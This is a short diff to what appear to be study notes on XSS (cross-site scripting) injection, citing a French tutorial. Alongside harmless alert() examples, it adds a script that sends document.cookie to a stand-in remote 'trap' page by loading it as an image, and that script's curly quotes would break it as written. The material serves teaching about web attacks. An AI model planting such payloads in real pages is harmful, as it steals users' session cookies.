@@ -11,4 +11,11 @@ https://apcpedagogie.com/les-injections-html-xss/
 <script type="text/javascript"> alert("Vulnérabilité détectée : faille XSS") ; </script>
 <img src="./chat.jpg" title="Une image de mon chat" />
 <script>alert('hackndo');</script>
-<img src="./chat.jpg" title="Une image" /><script>alert('hackndo');</script>
+<img src="./chat.jpg" title="Une image" />
+<script>alert('hackndo');</script>
+<script type="text/javascript">  
+  var addr = “http://www.serveur-distant.net/page-piege.php?cookie=” + document.cookie ;  
+  var imgTag = document.createElement("img") ;
+  imgTag.setAttribute("src",addr) ;
+  document.body.appendChild(imgTag) ;
+</script>
